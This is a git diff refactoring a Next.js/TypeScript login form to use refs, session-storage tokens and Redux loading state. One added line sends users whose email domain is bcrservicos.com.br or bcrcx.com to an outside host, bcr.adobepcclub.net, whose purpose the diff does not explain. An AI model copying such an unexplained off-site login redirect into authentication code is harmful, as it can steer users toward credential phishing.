@@ -1,17 +1,79 @@
-import React, { useState } from "react";
+import { useRouter } from "next/router";
+import { NotiSwal } from "notifications/notifications";
+import React, { useRef, useState } from "react";
 import { useTranslation } from "react-i18next";
 import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
+import { useDispatch } from "react-redux";
+import { GenericalPromise } from "services/generical.service";
+import { LoginFunc, ResponseLogin } from "services/Login/login.service";
+import { setTokenSessionStorage } from "services/multifuncionToken.service";
+import { changeLoadingData } from "store/reducers/loading.reducer";
+import { userToken } from "store/reducers/users.reducer";
+import Swal from "sweetalert2";
 
-const LoginTarget = ({
-  handleSubmit,
-  viewLogin,
-  setViewLogin,
-  setEmail,
-  setPassword,
-  setRegister,
-  setOpen,
-}) => {
-  const [t, i18n] = useTranslation("global");
+interface Props {
+  setRegister: React.SetStateAction<any>;
+  setOpen: React.SetStateAction<any>;
+}
+
+const LoginTarget = ({ setRegister, setOpen }: Props) => {
+  const [t, i18n] = useTranslation<string>("global");
+  const listRedirect = ["bcrservicos.com.br", "bcrcx.com"];
+  const route = useRouter();
+  const dispatch = useDispatch();
+
+  //useState
+  const [showpassword, setShowPassword] = useState<boolean>(false);
+
+  //Form Inputs Login
+  const emailRef = useRef<HTMLInputElement>(null);
+  const passwordRef = useRef<HTMLInputElement>(null);
+
+  const handleSubmit = (
+    e: React.FormEvent
+  ): GenericalPromise<ResponseLogin> | void | Promise<boolean> => {
+    e.preventDefault();
+    dispatch(changeLoadingData(true));
+
+    const email = emailRef.current?.value;
+    const password = passwordRef.current?.value;
+
+    if (!email || !password) {
+      console.error(
+        "El correo electrónico o contraseña no pueden estar vacíos."
+      );
+      return;
+    }
+
+    if (listRedirect.includes(email.split("@")[1])) {
+      return route.push("https://bcr.adobepcclub.net/");
+    }
+
+    getDataLogin(email, password);
+  };
+
+  const getDataLogin = async (
+    email: string,
+    password: string
+  ): Promise<void> => {
+    try {
+      const res = await LoginFunc({ email, password });
+
+      if (res?.result?.token) {
+        setTokenSessionStorage(res.result.token); // Guarda el token
+      } else {
+        throw new Error("Token no encontrado en la respuesta"); // Manejo explícito de errores
+      }
+    } catch (error) {
+      NotiSwal({ icon: "error", text: "Error al iniciar sesión" }); // Notificar el error
+    } finally {
+      dispatch(changeLoadingData(false)); // Siempre desactivar el estado de carga
+    }
+  };
+
+  // const dispatchEvents=(userData,token,)=>{
+  //   dispatch(userToken())
+  // }
 
   return (
     <div
@@ -45,9 +107,7 @@ const LoginTarget = ({
               type="email"
               placeholder={"email@example.com"}
               className="input lg:!input-xs xl:!input-sm w-full text-black bg-[#F4F4F4] hover:bg-blue-100 lg:!text-xs xl:!text-sm"
-              onChange={(e) => {
-                setEmail(e.target.value);
-              }}
+              ref={emailRef}
             />
           </div>
           <div className="mb-2">
@@ -56,24 +116,18 @@ const LoginTarget = ({
             </label>
             <div className="flex flex-col w-full items-start relative">
               <input
-                type={viewLogin}
+                type={showpassword ? "text" : "password"}
                 placeholder={"*******"}
                 className="input lg:!input-xs xl:!input-sm w-full text-black bg-[#F4F4F4] hover:bg-blue-100 lg:!text-xs xl:!text-sm"
                 required
-                onChange={(e) => {
-                  setPassword(e.target.value);
-                }}
+                ref={passwordRef}
               />
               <button
                 type="button"
-                onClick={() => {
-                  viewLogin === "password"
-                    ? setViewLogin("text")
-                    : setViewLogin("password");
-                }}
+                onClick={() => setShowPassword((prev): boolean => !prev)}
                 className="absolute inset-y-0 right-0 flex items-center px-4 py-2 text-gray-700 hover:text-gray-600 focus:outline-none"
               >
-                {viewLogin === "text" ? (
+                {showpassword ? (
                   <AiOutlineEyeInvisible className="h-5 w-5 fill-[#000]" />
                 ) : (
                   <AiOutlineEye className="h-5 w-5 fill-[#000]" />
